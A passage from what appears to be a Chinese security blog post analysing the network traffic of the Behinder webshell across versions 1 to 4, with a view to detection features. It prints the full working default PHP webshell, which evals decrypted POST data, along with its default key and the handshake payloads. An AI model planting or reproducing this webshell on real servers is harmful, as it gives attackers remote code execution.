class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">	<span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">	@<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>冰蝎 1 新增 shell 需要参数密码：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft4bnVJJtxQ6kErCKsLeFTbAQMCR.png" alt="" />
这里的密码并非会话密钥，只是 GET 请求 URL 的参数。
如果收到的是 GET 请求，则生成随机 16 位密钥，并将密钥写入 session，返回密钥明文。
如果收到的是 POST 请求，就从 session 中取出密钥，函数 file_get_contents(&quot;PHP://input&quot;)获取 POST 请求体的内容，对其进行 base64 解码之后，在进行 AES 解密，执行解密结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">assert|<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIG1haW4oJGNvbnRlbnQpDQp7DQoJJHJlc3VsdCA9IGFycmF5KCk7DQoJJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKCRjb250ZW50KTsNCiAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSRjb250ZW50PSJlODAzYTkzYi02N2VhLTQ3ZWQtYjBiMC03NWQxNGNmOTBiZDkiOw0KbWFpbigkY29udGVudCk7&#x27;</span>));</span><br><span class="line">base64解码后：</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;e803a93b-67ea-47ed-b0b0-75d14cf90bd9&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
<p>冰蝎 1 会以一次 GET 请求开始本次连接，本次 GET 请求的响应包 body 就是本次会话的 AES 使用的密钥，本次会话使用 AES/CBC/PKCS5Padding 加密，iv 是十六字节的 0x00 。GET 请求之后的第一个 POST 一般为请求基本信息，PHP 马就是请求 PHPinfo。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fou8RV5u8IC0kyYkuvtQtUo6FHzI.png" alt="" /></p>
<h2 id="冰蝎-2-多次-get可变载荷"><a class="markdownIt-Anchor" href="#冰蝎-2-多次-get可变载荷"></a> 冰蝎 2 多次 GET，可变载荷</h2>
<p>冰蝎 2webshell 相较于冰蝎 1 并没有太多改变，但在建立连接方面，冰蝎 2 会以至少两次 GET 请求开启一次与 webshell 的连接。通过比较前后两次请求包 body 的内容确定前后附加的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">11111payload22222</span><br><span class="line">11111another payload22222</span><br></pre></td></tr></table></figure>
<p>本次连接的会话密钥以最后一个 GET 请求的相应包 body 为准。两次 GET 显然提升了冰蝎马的灵活性。
建立连接时 GET 请求之后，还有一次 POST 请求，用于验证密钥，以下是该 POST 请求携带 payload 所执行的函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;f61e7813-2848-4fe0-b658-d24f5c019f03&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到这里协商密钥的依据是 content，找源码发现是随机生成的 uuid，长度固定，或许可以作为一种检测特征。如果服务端能够正确解码 content，这证明双方持有的密钥一致，可以开始通信了。</p>
<h2 id="冰蝎-3-预共享密钥无明文交互"><a class="markdownIt-Anchor" href="#冰蝎-3-预共享密钥无明文交互"></a> 冰蝎 3 预共享密钥，无明文交互</h2>
<p>首先，什么叫做预共享密钥？所谓预共享，即在未连接时已完成密钥共享，冰蝎 3 新增 shell 设置有参数密码。默认密钥是作者的 id 的 MD5 值，而 aes 密钥一般为 128bit，16 字节，于是取 key 值的 MD5 前十六位作为密钥。开始连接时，客户端会发起一个 POST 请求，发送使用 key 的 MD5 前十六位加密密文的 base64 编码，若服务端能够正确解码，那么证明本次密钥协商成功。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fu0ltOdco3qU_W_RccPBhJ_T_bzR.png" alt="" />
以下是冰蝎 3 的默认 PHP 木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>其基本功能就是解密 payload，执行其携带的函数，做了一定的免杀处理。本段更关注其加解密部分，参数 key 就是新建 shell 时参数密码值 MD5 的前 16 位，刚好 128bit。这个值当然也可以修改，改成别的字符串，PHP 马的参数 key 也需要更改成该字符串的 MD5 值前 16 位。
协商密钥的 GET 请求包是冰蝎 1、2 的重要特征，冰蝎 3 采用预共享密钥，规避了密钥的明文传输，使流量更加隐蔽，在当时是对各家 waf 的一个全新考验。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ft6mzNQcwOvTAdNHg6lH8vPEQdQz.png" alt="" />
建立连接的 POST 请求包的 Payload 功能是让服务端执行以下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">	<span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">			<span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="variable">$content</span>=<span class="string">&quot;Y3dDMXpSa2o3OURScHlpcWNMVGVnNEt2ZVUyckR3SkJkcnVZakx4aGRXVnY3MkhkdHBkcFdYMXpJYkRQWVRPWmNhUDRMelhLdVZtT0VHczhCdDdqbmZQME5vOFEyVDdzTTNhajVHZWp4a2FHRkxiSU1UT1U1a0VWeGJIbmRwTkluU3liTkRienQ2QURXbllqOVZRNzRkbktBaGJVeEt2azFvM3M2MWNJU1pMZk1vQWdjY2Z3QnhMRHR1TnlETldaamJKVE8yOTFsU2pvak5jOGdrT2pKYlFwMTIzZnhSUXRHVmhrY05hdmNPbzV5a2tVR2JWQ2s=&quot;</span>;<span class="variable">$content</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
<p>其中参数 content 就是本次密钥协商的凭证，服务段会用之前提到写入冰蝎 3PHP 马 AES 加密 content 内容，以响应的形式发回客户端。客户端再用协商的密钥解密响应包的 body，若有 content 相同，就代表客户端服务端持有的密钥一致，就可以开始愉快的通信。比起冰蝎 2 使用固定长度的 content 作为凭证，冰蝎 3 的 content 是 3000 字符以上的随机长度字符串，更添隐蔽性。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fg5TALp7S6xmw01TTMyl2uamn_ci.png" alt="" />
若服务端不能正确解码，则表示密钥错误或其他原因，一般连接失败冰蝎都会提示原因。如果第一个 POST 请求没有被及时或正确响应，客户端会发送第二次 POST 请求，若依旧未被正确解码，则恢复冰蝎 1 的密钥交换方式。如上图所示，一次 POST 请求的响应会 set 一个 cookie，两次 POST 请求 set 了两个 cookie；由于解码失败，上传的 webshell 中也没有配置处理 GET 请求的方法，于是 GET 请求的响应 body 是空的。</p>
<h2 id="冰蝎-4-密钥写入木马"><a class="markdownIt-Anchor" href="#冰蝎-4-密钥写入木马"></a> 冰蝎 4 密钥写入木马</h2>
<p>冰蝎 4 的 webshell 可以完全自定义加解密方式，作者称之为通信协议。到冰蝎 4.0.5，加密方式有以下几种：default_xor、default_xor_base64、default_aes、default_image、default_json、aes_with_magic。其中看到 github 上 issue 中提到 default_xor 可破解，本地测试使用 4.0.3 版本，default_xor 马连接不上，改其他加密方式就好了。使用前，需先配置传输协议，选择相应的协议名称，点击生成服务器。可以修改加解密代码，在下方测试加解密结果，最后点击保存。然后在冰蝎 jar 包的目录下会生成 server 文件夹，将其中的木马上传即可。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fp2UxRXmqy9DUn42YOP1RZXDRQTs.png" alt="" />
冰蝎 4 新增 shell 不需要任何参数，但必须指定传输协议，相应的传输协议需在上面的本步骤中保存到本地。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnZm4jwvMztKVtm55kWQhWyPfIwD.png" alt="" />
之后使用 default_aes 方式作为示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">   <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();  <span class="comment">//初始化session，避免connect之后直接background，后续getresult无法获取cookie</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="variable">$key</span>,OPENSSL_PKCS1_PADDING));</span><br><span class="line">   &#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="string">&quot;MzZjSHFEbUp2akZVSWNYVUhGb3Q4bnBQQVkzeXV6U2xEcWU0TjVsNEg1Y3ZCRmw3cnZrQ2ZXdzlsaVpzekxjcTE3b3JKT3hiMVVWTXVDNlNjNHplUFFnWk1PZjd0eWxvWEg3TTI2RGdCdDI2Ylg2dkx0cUNydmUzQ0lCMkg4WEZBbExEeEZDZHVyOUV0d3AwMnZJWUdKWHVScHA2YzR0VEozSHlldGtuc2JreW9NclpFSGJwZkMzT1NaSTFEMXVIQ211RFNTeFE0dTRWcDF5MUNEVXFGTUViNzZLaVRKYk5NejZxSlZGSTJBRzBxVUFidXVnOWxxbGVBbVN1cDJ3MEN0cTNlb2xLSGlJYkhBSk1RUVhYZVFyVmtjT2tTQU02S1plV25MYXdSaHUwZnVSRGU1dFRCR3NnVjB2bUljQzNZeFZLRDJnSVRDVVVBOHk5b0ZIb0V6NDQwTmVCTTJEWHVjQW5GakR4Mm9rdkdaMmpXNllVOExuZExkNUEydmE4dzFGTk1wRTdVeEs1a2ZCZG1QZktYVG9wcWYzanpSNGhEM2NIVGN3b3YyUHdMS1d5cVNLWkNWZzZOTWlSN0NvdHNkQVl0WWpGM1FDOEVJNUwyZ0hwRjRsZFVtM0hsekxvQjVROFBualV3cUZubXU4WWxndnMxWFR5ZkVJRHZQQXZqWW84b3htcjhoY254cUVQaHc1eG9VOUJHSnhFVThYOU5QeE52VWpIakhGTVp4U1NwSkJZczZDQnhRQ2JFcFJKYnBhZTBQSjh5eldjNWxBU3Z2ckYyZUw2RGNpczJJZzEwamhLa293ZTR1dFIxQXlOU3dxWWlZNVdrRFo0UjBXbHU0WTVEdkVIOTVGWlRUN0hHOWxEU0F0dXR5elFDUEdOOXlXNWl0NVFjbml3T0NaZmY3TzBFVlhzSzFRT1dvNXd3NmloZDVJMUZsbDlxcWMzVklxTjQ2UVVnTU5qOEtKNjFQdXNMendlRk1KNUMycFBoOFlFTko0VjNkUklEdkdKTFg3WEFBRFltZ284TDFmZko3bzlCUlpkT2E0SEY5UkNLc0RKMFNFWlg2aDk4Y2lBb2FwcmVvelFpSTVoSnp3ajBiQXFRWjFFS1hROEJCdWJvQTVqNWROdVRUYlBGTmo3WkNpWndHdUhGMXhBUVRLdFFkODdQNEFTaW82aTZOVHFYbVh6ZWZDMklQZ0N3YzJpeXBZNjdDT1o0VVBKd1JUYUpNSEdmUnhUMTVoNWV1M2VMNHZpNUNYYTdVak84VHY5N0FDS0dweUVTRGd6aXZUbFZoTldRcVk5cEtZUlViakhhTEcyN0Vhd2ZCZHhvMWdtWTNCVlI0bzNwbm9QdmJTUkkzaE9DVFl6ZVhXb1BIeE9NdXEydmZYM1E3dkJEUXk1VDBXVVVHeEdkS2phV3huQ2s4QUJjdHo5Y2tneVhPVks0SFJ3SmtTUFE0MUcwdGdXV0ZaNUttdE5oOHA5RWJDc25MWHlqaHFxd1FpbDlWeWs5Mk1IdVlWblhPNld0aEdSOWtiMGZsb1EzUEpRWWp1VURBdWZEcFp4Rm1EdnBNcjRCM1JZaFNwWnlZdDc3RUdrWFRtVVdkY0FYS0I1UjNCOXQ3Wkd1RlBiSk9xWXg0c2xmcDhiZWtIeGtCSUtvTTkyMHRHZXdTeDQ5WEFPQ2RYOHpWV1dZTElnQ09EcTlKRE5WVXRpa0V5SFlZT2YzUFdNdlR6cXJDeG9NcHdCTkt5d0FuT2t1STFFMWVmUElnOVpkcVFBbjd2a3E0V0lOOFlVaGNFYm5MUEZQY3BvYlJJVk5iSjhVTk9QdXcyZUdiSFF5cUtWOFkzUDRyZE41c01FNTJiMWRKWkZTZml3QVVRaUo4cTAySEtzcW42aGxWQnhOQXlRa1pJZzJCQmtrMFdVRzcwTkUxalFsTG1UYW92NTVqcmV1ZUhjS2hKVmVidkt4V3pyVmVKY2xBVFoxWGwxb0xwSFg2amdDbnBpd0I3NnpUcTRFTzhJdzFBdVlLNHpOa21Tb2RpWE1NZnBYekxmZ2gxZktSN1NhQms3ekZzNUc0NE9sTUpzeVM1VnhCMWV6ZnhaZUt5SkxEWldKemRYTVdTZHhSVE5hWXZYb3JpRzBpREgybDN4ZnpBYWJNZUd4ZVZTbDZBeGlUTzVoSjJIbTlsVTFjM214WXRNNmcxa1lGbm1VZElOUTFReVByTEZYdlIyckR0VTAzYWc4Y2w5WGFoYnI2eEx4VmpOZlhlOEFPa3psSVh3UTF4MUFjakV6eWpTanBJeERlSFN5NEFIOWZWc2ZZRmEwN1pjYUdoSGM4YXU5U21qejVueXBFbjNOeEFlMDNRT1E5N01YNngyUU1Y&quot;</span>;<span class="variable">$content</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
<p>冰蝎 4 的 default aes 模式传的 payload 是 AES/ECB/PKCS5Padding，和前几代冰蝎不同，所以冰蝎 4 并不能兼容前几代冰蝎马，需要注意。密钥协商方式与冰蝎 3 一致，content 的生成方式也相同，但第一次 POST 请求没有被正确或及时响应不再重发。连接成功之后，客户端会自动 POST 请求 phpinfo。</p>
<h1 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h1>
<p>冰蝎每个版本之间其他方面的流量特征都有细微变化，但都具体写出来文章就显得冗长了。最后简单提一下，内置 UA 头更新、程序定义 http 头部字段不同、心跳包变化（长度、内容）等。对于 shell 实体的其他功能实现上都有不小的改进，随便哪个方面都是能新写一篇文章的程度，这里就不多说了。
